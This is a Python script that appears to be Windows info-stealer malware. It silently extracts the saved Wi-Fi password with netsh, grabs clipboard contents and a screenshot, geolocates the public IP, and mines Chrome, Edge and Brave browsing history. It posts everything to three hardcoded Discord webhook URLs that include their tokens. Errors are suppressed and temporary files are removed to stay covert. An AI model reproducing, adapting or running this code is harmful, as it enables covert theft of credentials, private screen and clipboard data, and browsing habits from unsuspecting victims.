import os
import shutil
import socket
import sqlite3
import subprocess
from collections import Counter
from datetime import datetime, timezone
from urllib.parse import urlparse

import getpass
import platform
import requests
import psutil
import pyperclip
from PIL import ImageGrab

WIFI_WEBHOOK_URL = "https://discord.com/api/webhooks/1459378040332222702/fVl25Ogayf2gW9wAR3wuGRKwvI_o8lJm-WmqZdwgawIGxLeqUtE7Hbytp-hGhCVpCDQO"
SITES_WEBHOOK_URL = "https://discord.com/api/webhooks/1459381801494642763/_TweeXz2DCpwYJwlRnQuWzC6CP1hTm-3BW7A5Z0S6vrKm6LCC5F5S2ez8deNP5oeptzj"
INFO_WEBHOOK_URL = "https://discord.com/api/webhooks/1459083733616427060/f6SNkQxaSG4yPh6vFUPEFdqVAJEZBISicZvQCbSwFtErK5eeQWfJrf4V5id7VyLOZCgg"

HISTORY_PATHS = [
    os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History"),
    os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History"),
    os.path.expanduser(r"~\AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\History"),
]


def get_current_wifi_info():
    if socket.gethostname().lower() == "unknown":
        return None, None

    try:
        info = subprocess.run(
            ["netsh", "wlan", "show", "interfaces"],
            capture_output=True,
            text=True,
            creationflags=0x08000000,
            check=False,
        ).stdout

        ssid = None
        for line in info.splitlines():
            if "SSID" in line and "BSSID" not in line:
                ssid = line.split(":", 1)[1].strip()
                break

        if not ssid:
            return None, None

        pw_info = subprocess.run(
            ["netsh", "wlan", "show", "profile", f'name="{ssid}"', "key=clear"],
            capture_output=True,
            text=True,
            creationflags=0x08000000,
            check=False,
        ).stdout

        password = "Not found / not saved"
        for line in pw_info.splitlines():
            if "Key Content" in line:
                password = line.split(":", 1)[1].strip()
                break

        return ssid, password
    except Exception:
        return None, None


def build_wifi_message():
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    user = getpass.getuser()
    host = socket.gethostname()

    ssid, password = get_current_wifi_info()

    if ssid is None:
        content = (
            "**Wi-Fi Info** (failed to retrieve)\n"
            f"• {now}\n"
            f"• {user} @ {host}\n\n"
            "Could not get current Wi-Fi information"
        )
    else:
        content = (
            "**Current Wi-Fi Information**\n"
            f"• User: {user}\n"
            f"• Host: {host}\n"
            f"• Logged: {now}\n\n"
            f"**WiFi Name:** {ssid}\n"
            f"**Password:** `{password}`"
        )

    return content


def send_wifi_log():
    try:
        message = build_wifi_message()
        requests.post(WIFI_WEBHOOK_URL, json={"content": message}, timeout=7)
    except Exception:
        pass


def get_public_ip():
    try:
        return requests.get("https://api4.ipify.org", timeout=5).text
    except Exception:
        return "Unavailable"


def get_city_from_ip(ip):
    if ip == "Unavailable":
        return "Unavailable"
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        data = response.json()
        if data.get("status") == "success":
            return data.get("city", "Unknown")
        return "Unknown"
    except Exception:
        return "Unknown"


def get_wifi_name():
    if platform.system() != "Windows":
        return "Unavailable (non-Windows)"
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        output = subprocess.check_output(
            ["netsh", "wlan", "show", "interfaces"],
            text=True,
            encoding="utf-8",
            errors="ignore",
            startupinfo=startupinfo,
        )
        for line in output.splitlines():
            if "SSID" in line and "BSSID" not in line and ":" in line:
                name = line.split(":", 1)[1].strip()
                return name if name else "Not connected to WiFi"
        return "Not connected to WiFi"
    except Exception:
        return "Unavailable"


def get_system_info():
    os_name = platform.system()
    os_version = platform.version()
    os_full = f"{os_name} {os_version}"

    device_type = "Unknown"
    try:
        device_type = "Laptop" if psutil.sensors_battery() else "Desktop"
    except Exception:
        pass

    public_ip = get_public_ip()
    city = get_city_from_ip(public_ip)
    wifi_name = get_wifi_name()

    try:
        clipboard = pyperclip.paste()
        if clipboard and len(clipboard) > 1000:
            clipboard = f"{clipboard[:1000]}... (truncated)"
        clipboard = clipboard or "Empty"
    except Exception:
        clipboard = "Unavailable"

    screenshot_path = None
    try:
        screenshot = ImageGrab.grab()
        screenshot_path = "temp_screenshot.png"
        screenshot.save(screenshot_path, "PNG")
    except Exception:
        pass

    return {
        "os_full": os_full,
        "device_type": device_type,
        "public_ip": public_ip,
        "city": city,
        "wifi_name": wifi_name,
        "username": getpass.getuser(),
        "clipboard": clipboard,
        "screenshot_path": screenshot_path,
    }


def send_message_to_webhook(webhook_url, message, screenshot_path=None):
    data = {"content": message}
    files = None
    file_handle = None

    if screenshot_path and os.path.exists(screenshot_path):
        file_handle = open(screenshot_path, "rb")
        files = {"file": ("screenshot.png", file_handle, "image/png")}

    try:
        requests.post(webhook_url, data=data, files=files, timeout=15)
    except Exception:
        pass
    finally:
        if file_handle:
            file_handle.close()
        if screenshot_path and os.path.exists(screenshot_path):
            try:
                os.remove(screenshot_path)
            except Exception:
                pass


def send_info_log():
    hostname = socket.gethostname()
    sys_info = get_system_info()
    message_to_send = (
        "**Info Logger Ran**\n"
        f"Host: {hostname}\n"
        f"Username: {sys_info['username']}\n"
        f"OS: {sys_info['os_full']}\n"
        f"Device Type: {sys_info['device_type']}\n"
        f"Public IP: {sys_info['public_ip']}\n"
        f"City: {sys_info['city']}\n"
        f"WiFi Network Name: {sys_info['wifi_name']}\n\n"
        f"**Clipboard Content:**\n{sys_info['clipboard']}"
    )
    send_message_to_webhook(INFO_WEBHOOK_URL, message_to_send, sys_info["screenshot_path"])


def extract_domain(url):
    try:
        parsed = urlparse(url)
        domain = parsed.netloc.lower()
        if domain.startswith("www."):
            domain = domain[4:]
        return domain if domain else ""
    except Exception:
        return ""


def read_recent_history(db_path):
    if not os.path.exists(db_path):
        return []

    temp_db = "temp_hist.db"
    try:
        shutil.copy2(db_path, temp_db)
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()

        base = datetime(1601, 1, 1, tzinfo=timezone.utc)
        now = datetime.now(timezone.utc)
        now_webkit = int((now - base).total_seconds() * 1000000)
        threshold = now_webkit - (30 * 24 * 60 * 60 * 1000000)

        query = """
        SELECT urls.url, COUNT(visits.id) as visit_count
        FROM urls
        JOIN visits ON urls.id = visits.url
        WHERE visits.visit_time > ?
        GROUP BY urls.url
        ORDER BY visit_count DESC
        LIMIT 60
        """

        cursor.execute(query, (threshold,))
        results = cursor.fetchall()
        conn.close()
        return results
    except Exception:
        return []
    finally:
        if os.path.exists(temp_db):
            try:
                os.remove(temp_db)
            except Exception:
                pass


def get_top_5_last_month():
    all_recent = []
    for path in HISTORY_PATHS:
        history = read_recent_history(path)
        all_recent.extend(history)

    if not all_recent:
        return []

    domain_counter = Counter()
    for url, count in all_recent:
        domain = extract_domain(url)
        if domain:
            domain_counter[domain] += count

    return domain_counter.most_common(5)


def send_sites_log():
    top5 = get_top_5_last_month()

    now_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    if not top5:
        message = (
            "**Top 5 Domains (Last 30 Days)**\n"
            f"{now_str}\n"
            "No recent history could be read"
        )
    else:
        lines = [
            "**Top 5 Most Visited Domains (Last 30 Days)**",
            f"{now_str}",
        ]
        for i, (domain, visits) in enumerate(top5, 1):
            lines.append(f"{i}. {domain}  —  ≈{visits:,} visits")
        message = "\n".join(lines)

    try:
        requests.post(SITES_WEBHOOK_URL, json={"content": message}, timeout=7)
    except Exception:
        pass


def main():
    send_wifi_log()
    send_info_log()
    send_sites_log()


if __name__ == "__main__":
    main()
